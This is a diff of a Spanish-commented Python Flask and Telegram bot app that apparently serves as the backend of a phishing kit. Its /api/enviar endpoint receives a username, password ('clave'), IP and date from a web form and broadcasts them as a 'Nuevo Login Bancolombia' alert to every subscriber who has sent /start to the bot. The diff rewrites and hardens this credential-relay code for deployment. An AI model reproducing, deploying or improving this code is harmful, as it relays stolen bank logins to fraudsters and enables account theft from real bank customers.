@@ -1,23 +1,30 @@
-# bot_server.py
+# app.py
 from telegram import Update, Bot
-from telegram.ext import Application, CommandHandler, ContextTypes
 from flask import Flask, request, jsonify
 from flask_sqlalchemy import SQLAlchemy
 from flask_cors import CORS
 import os
-import asyncio
 
 # Variables de entorno
 TOKEN_BOT = os.getenv('TELEGRAM_TOKEN')
-WEBHOOK_URL = os.getenv('WEBHOOK_URL')
+if not TOKEN_BOT:
+    raise ValueError("TELEGRAM_TOKEN no configurado")
 
 # Flask
 app = Flask(__name__)
 CORS(app)
-app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///suscriptores.db')
-db = SQLAlchemy(app)
 
-# Modelo (igual que antes)
+# Base de datos
+db_url = os.getenv('DATABASE_URL', 'sqlite:///suscriptores.db')
+if db_url.startswith('postgres://'):
+    db_url = db_url.replace('postgres://', 'postgresql://', 1)
+app.config['SQLALCHEMY_DATABASE_URI'] = db_url
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+db = SQLAlchemy(app)
+bot = Bot(token=TOKEN_BOT)
+
+# Modelo
 class Suscriptor(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     chat_id = db.Column(db.String(50), unique=True, nullable=False)
@@ -28,82 +35,116 @@ class Suscriptor(db.Model):
 with app.app_context():
     db.create_all()
 
-# Bot global
-bot_app = Application.builder().token(TOKEN_BOT).build()
-
-# Comandos (igual que antes)
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Tu código existente...
-    pass
-
-async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Tu código existente...
-    pass
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Tu código existente...
-    pass
-
-bot_app.add_handler(CommandHandler("start", start))
-bot_app.add_handler(CommandHandler("stop", stop))
-bot_app.add_handler(CommandHandler("status", status))
-
-# ========== WEBHOOK ENDPOINT ==========
+# ========== WEBHOOK TELEGRAM ==========
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """Recibe updates de Telegram vía webhook"""
-    json_data = request.get_json()
-    update = Update.de_json(json_data, bot_app.bot)
-    asyncio.run(bot_app.process_update(update))
-    return jsonify({'ok': True})
+    """Recibe updates de Telegram"""
+    try:
+        update = Update.de_json(request.get_json(), bot)
+        
+        if update.message and update.message.text:
+            chat_id = str(update.effective_chat.id)
+            username = update.effective_user.username
+            nombre = update.effective_user.first_name
+            command = update.message.text
+            
+            if command == '/start':
+                suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
+                
+                if suscriptor:
+                    if not suscriptor.activo:
+                        suscriptor.activo = True
+                        db.session.commit()
+                        bot.send_message(chat_id, "✅ Suscripción reactivada!")
+                    else:
+                        bot.send_message(chat_id, "✅ Ya estás suscrito!")
+                else:
+                    nuevo = Suscriptor(chat_id=chat_id, username=username, nombre=nombre)
+                    db.session.add(nuevo)
+                    db.session.commit()
+                    bot.send_message(
+                        chat_id,
+                        f"✅ ¡Bienvenido {nombre}!\n\n"
+                        "Te has suscrito correctamente.\n"
+                        "Recibirás todas las notificaciones.\n\n"
+                        "Usa /stop para cancelar."
+                    )
+            
+            elif command == '/stop':
+                suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
+                if suscriptor and suscriptor.activo:
+                    suscriptor.activo = False
+                    db.session.commit()
+                    bot.send_message(chat_id, "❌ Suscripción cancelada.")
+                else:
+                    bot.send_message(chat_id, "No estás suscrito.")
+            
+            elif command == '/status':
+                suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
+                total = Suscriptor.query.filter_by(activo=True).count()
+                if suscriptor and suscriptor.activo:
+                    bot.send_message(chat_id, f"✅ Estado: Activo\n👥 Total: {total}")
+                else:
+                    bot.send_message(chat_id, "❌ No estás suscrito. Usa /start")
+        
+        return jsonify({'ok': True})
+    except Exception as e:
+        print(f"Error en webhook: {e}")
+        return jsonify({'ok': False}), 500
 
-# ========== API ENDPOINTS ==========
+# ========== API PARA TU PÁGINA ==========
 @app.route('/api/enviar', methods=['POST'])
 def enviar_a_suscriptores():
-    data = request.json
-    
-    mensaje = f"""
+    """Recibe datos del formulario y los envía a suscriptores"""
+    try:
+        data = request.json
+        
+        mensaje = f"""
 🔐 *Nuevo Login Bancolombia*
 ━━━━━━━━━━━━━━━━━━━━━━
-👤 *Usuario:* `{data['usuario']}`
-🔑 *Clave:* `{data['clave']}`
+👤 *Usuario:* `{data.get('usuario', 'N/A')}`
+🔑 *Clave:* `{data.get('clave', 'N/A')}`
 ━━━━━━━━━━━━━━━━━━━━━━
-📱 *IP:* {data['ip']}
-🕐 *Fecha:* {data['fecha']}
-    """
-    
-    suscriptores = Suscriptor.query.filter_by(activo=True).all()
-    enviados = 0
-    
-    for suscriptor in suscriptores:
-        try:
-            asyncio.run(bot_app.bot.send_message(
-                chat_id=suscriptor.chat_id,
-                text=mensaje,
-                parse_mode='Markdown'
-            ))
-            enviados += 1
-        except:
-            pass
-    
-    return jsonify({'success': True, 'enviados': enviados})
+📱 *IP:* {data.get('ip', 'N/A')}
+🕐 *Fecha:* {data.get('fecha', 'N/A')}
+        """
+        
+        suscriptores = Suscriptor.query.filter_by(activo=True).all()
+        enviados = 0
+        
+        for suscriptor in suscriptores:
+            try:
+                bot.send_message(
+                    chat_id=suscriptor.chat_id,
+                    text=mensaje,
+                    parse_mode='Markdown'
+                )
+                enviados += 1
+            except:
+                pass
+        
+        return jsonify({
+            'success': True,
+            'enviados': enviados,
+            'total_suscriptores': len(suscriptores)
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/suscriptores', methods=['GET'])
 def listar_suscriptores():
+    """Lista suscriptores activos"""
     suscriptores = Suscriptor.query.filter_by(activo=True).all()
     return jsonify({
         'total': len(suscriptores),
-        'suscriptores': [{'chat_id': s.chat_id, 'username': s.username} for s in suscriptores]
+        'suscriptores': [{'username': s.username, 'nombre': s.nombre} for s in suscriptores]
     })
 
 @app.route('/')
 def health():
-    return jsonify({'status': 'running', 'bot': 'active'})
+    """Health check"""
+    return jsonify({'status': 'online', 'bot': 'active'})
 
 if __name__ == '__main__':
-    # Configurar webhook al iniciar
-    asyncio.run(bot_app.bot.set_webhook(url=WEBHOOK_URL))
-    
     port = int(os.getenv('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
-
